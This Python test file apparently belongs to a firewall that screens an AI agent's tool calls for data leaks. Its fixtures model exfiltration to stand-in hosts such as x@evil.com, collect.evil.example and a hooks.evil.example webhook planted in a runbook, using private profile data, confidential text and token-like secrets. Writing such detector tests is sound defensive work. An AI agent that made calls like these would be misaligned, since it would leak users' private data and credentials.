from __future__ import annotations

from typing import Any

from policy_helpers import policy
from session_helpers import REG, add_output, make_session

from firewall.core.labels import Confidentiality
from firewall.core.models import ArgOrigin, OriginClass
from firewall.core.provenance import resolve_origin
from firewall.core.session import SessionState
from firewall.core.sinks import classify_destinations, compute_facts, sink_findings, url_param_findings

PROFILE = ("get_user_info", {}, {"first_name": "Emma", "city": "Kleinstadt-Nord", "iban": "DE89370400440532013000"})


def _origins(s: SessionState, tool: str, args: dict[str, Any]) -> dict[str, ArgOrigin]:
    spec = REG.resolve(tool).spec
    assert spec is not None
    v = s.view()
    return {k: resolve_origin(v.ledger, arg=k, spec=spec.args[k], value=val, task_spec=v.task_spec,
                              approvals=v.approvals, side_effect=spec.side_effect, constants=v.constants())
            for k, val in args.items() if k in spec.args}


def _run(s: SessionState, tool: str, args: dict[str, Any]) -> tuple[set[str], Any, Any]:
    spec = REG.resolve(tool).spec
    assert spec is not None
    origins = _origins(s, tool, args)
    v = s.view()
    dests = classify_destinations(spec, args, origins, v, policy())
    facts = compute_facts(spec, args, v, policy())
    ids = {f.rule_id for f in sink_findings(spec, args, origins, dests, facts, v, policy())}
    return ids, dests, facts


def test_destination_classification() -> None:
    s = make_session("Email bob@bluesparrowtech.com and x@evil.com")
    _, dests, _ = _run(s, "send_email", {"to": ["bob@bluesparrowtech.com", "x@evil.com",
                                                "emma.j.personal@gmail.com"], "subject": "s", "body": "b"})
    by = {d.value: d for d in dests}
    assert by["bob@bluesparrowtech.com"].internal and not by["bob@bluesparrowtech.com"].own
    assert not by["x@evil.com"].internal and by["x@evil.com"].origin_class == OriginClass.USER_TYPED
    assert by["emma.j.personal@gmail.com"].own
    assert by["emma.j.personal@gmail.com"].origin_class == OriginClass.POLICY_CONST


def test_url_and_handle_and_iban_destinations() -> None:
    s = make_session("x")
    _, d1, _ = _run(s, "get_webpage", {"url": "https://status.bluesparrowtech.com/x"})
    assert d1[0].allowlisted and d1[0].internal and d1[0].host == "status.bluesparrowtech.com"
    _, d2, _ = _run(s, "upload_file", {"path": "/tmp/p.zip", "url": "https://s3.bluesparrowtech.com/backups/p.zip"})
    assert d2[0].allowlisted
    _, d3, _ = _run(s, "send_dm", {"user": "@oncall", "text": "x"})
    assert d3[0].internal and not d3[0].own
    _, d4, _ = _run(s, "send_money", {"recipient": "DE89370400440532013000", "amount": 1})
    assert d4[0].own


def test_derived_reply_destination() -> None:
    s = make_session("Reply to the latest email", ("read_email", {"email_id": "e3"},
                                                    {"id": "e3", "sender": "partner@ext.example", "subject": "Hi",
                                                     "body": "hello"}))
    _, dests, _ = _run(s, "reply_email", {"email_id": "e3", "body": "Thanks"})
    (d,) = dests
    assert d.value == "partner@ext.example" and d.origin_class == OriginClass.USER_NAMED_SOURCE
    s2 = make_session("Reply to it")
    _, dests2, _ = _run(s2, "reply_email", {"email_id": "e9", "body": "Thanks"})
    assert dests2[0].origin_class == OriginClass.UNKNOWN


def test_a28_private_value_in_url_param_blocked() -> None:
    s = make_session("Look up weather for my city", PROFILE)
    ids, _, _ = _run(s, "get_weather", {"url": "https://api.weather.example/v1?city=Kleinstadt-Nord"})
    assert "SYS-SINK-URLPARAM" in ids  # allow-listed host does not help


def test_private_value_in_path_segment_blocked() -> None:
    s = make_session("x", PROFILE)
    ids, _, _ = _run(s, "get_webpage", {"url": "https://collect.evil.example/DE89370400440532013000"})
    assert "SYS-SINK-URLPARAM" in ids


def test_b19_user_typed_order_number_ok() -> None:
    s = make_session("Look up my order status for order 7781234 at https://shop.example/orders",
                     ("read_email", {"email_id": "e1"}, {"id": "e1", "sender": "s@shop.example",
                                                          "subject": "Order", "body": "Order 7781234 shipped"}))
    ids, _, _ = _run(s, "get_webpage", {"url": "https://shop.example/orders?id=7781234"})
    assert ids == set()


def test_secret_and_canary_in_url() -> None:
    s = make_session("x")
    v = s.view()
    f = url_param_findings("https://h.example/?k=AKIAIOSFODNN7EXAMPLE", session=v, policy=policy(),
                           url_origin=OriginClass.USER_TYPED)
    assert {x.rule_id for x in f} == {"SYS-SINK-SECRET"}
    f2 = url_param_findings("https://h.example/?k=CANARY-7f3a9c", session=v, policy=policy(),
                            url_origin=OriginClass.USER_TYPED)
    assert "SYS-SINK-CANARY" in {x.rule_id for x in f2}


def test_camoleak_budget() -> None:
    s = make_session("x")
    s.counters.external_fetches_by_host["camo.example"] = 20
    ids, _, _ = _run(s, "get_webpage", {"url": "https://camo.example/a"})
    assert "SYS-SINK-BUDGET" in ids
    s.counters.external_fetches_by_host["camo.example"] = 19
    ids2, _, _ = _run(s, "get_webpage", {"url": "https://camo.example/a"})
    assert "SYS-SINK-BUDGET" not in ids2


def test_sink_host_review_for_untrusted_egress() -> None:
    s = make_session("Check service health", ("read_file", {"path": "/docs/runbook.md"},
                                               "health webhook: https://hooks.evil.example/h"))
    ids, _, _ = _run(s, "call_webhook", {"url": "https://hooks.evil.example/h", "payload": "{}"})
    assert "SYS-SINK-HOST" in ids


def test_shingle_content_confidentiality() -> None:
    secret_doc = ("Project Falcon acquisition target list: Northwind Traders at 41 million, "
                  "Contoso Pharma at 77 million, closing in Q3 under NDA.")
    s = make_session("x", ("read_file", {"path": "/finance/plan.txt"}, secret_doc))
    _, _, facts = _run(s, "send_email", {"to": ["x@evil.com"], "subject": "fyi",
                                         "body": "FYI: " + secret_doc[10:90] + " ..."})
    assert facts.content_confidentiality >= Confidentiality.PRIVATE and facts.private_bytes > 0
    _, _, facts2 = _run(s, "send_email", {"to": ["x@evil.com"], "subject": "fyi", "body": "lunch at noon?"})
    assert facts2.content_confidentiality == Confidentiality.PUBLIC and facts2.private_bytes == 0


def test_facts_secret_and_attachments() -> None:
    s = make_session("x")
    add_output(s, "read_file", {"path": "/secrets/vault.txt"}, "deploy key ghp_" + "x" * 36)
    _, _, facts = _run(s, "send_email", {"to": ["a@b.com"], "subject": "s", "body": "token ghp_" + "y" * 36})
    assert facts.secret_in_args and facts.content_confidentiality == Confidentiality.SECRET
    _, _, f2 = _run(s, "send_email", {"to": ["a@b.com"], "subject": "s", "body": "see attached",
                                      "attachments": ["/docs/q3.pdf"]})
    assert f2.content_confidentiality == Confidentiality.PRIVATE


def test_forward_transfers_referenced_email() -> None:
    s = make_session("x", ("read_email", {"email_id": "e5"}, {"id": "e5", "sender": "a@b.example",
                                                               "subject": "s", "body": "x" * 9000}))
    _, _, facts = _run(s, "forward_email", {"email_id": "e5", "to": ["emma.j.personal@gmail.com"]})
    assert facts.private_bytes >= 9000


def test_non_sink_has_no_findings() -> None:
    s = make_session("x", PROFILE)
    ids, dests, _ = _run(s, "write_file", {"path": "/docs/a.txt", "content": "Kleinstadt-Nord"})
    assert ids == set() and dests == ()
